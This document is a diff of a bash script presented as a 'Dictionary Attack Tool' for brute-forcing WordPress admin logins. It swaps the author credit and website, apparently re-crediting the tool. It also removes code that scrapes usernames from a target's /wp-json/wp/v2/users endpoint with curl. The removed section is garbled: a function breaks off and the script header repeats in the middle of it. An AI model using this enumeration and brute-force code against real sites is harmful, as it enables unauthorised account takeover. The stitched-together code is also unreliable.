@@ -1,51 +1,10 @@
 #!/bin/bash
-# Name       : Wordpress Brutefosh
+# Name       : Wordpress Bruteforce
 # Version    : 1.2
 # Desc.      : Dictionary Attack Tool - Wordpress Admin
-# Coded by   : Schopath
-# Website    : www.zerobyte.id
-# Updated on : 2019-03-28
-
-#----------- CONFIGURATION -----------
-curl_timeout=20
-multithread_limit=10
-#--------- CONFIGURATION EOF ---------
-
-if [[ -f wpusername.tmp ]]
-then
-	rm wpusername.tmp
-fi
-RED='\e[31m'
-GRN='\e[32m'
-YEL='\e[33m'
-CLR='\e[0m'
-
-function _GetUserWPJSON() {
-	Target="${1}";
-	UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
-	echo ""
-	if [[ -z ${UsernameLists} ]];
-	then
-		echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
-	else
-		echo -ne > wpusername.tmp
-		for Username in ${UsernameLists};
-		do
-			echo "INFO: Found username \"${Username}\"..."
-			echo "${Username}" >> wpusername.tmp
-		done
-	fi
-}
-
-function _TestLogin() {
-	Target="${1}"
-#!/bin/bash
-# Name       : Wordpress Brutefosh
-# Version    : 1.2
-# Desc.      : Dictionary Attack Tool - Wordpress Admin
-# Coded by   : Schopath
-# Website    : www.zerobyte.id
-# Updated on : 2019-03-28
+# Coded by   : Wahyu Haxor
+# Website    : blog.exploit.info
+# Updated on : 2021-03-28
 
 #----------- CONFIGURATION -----------
 curl_timeout=20
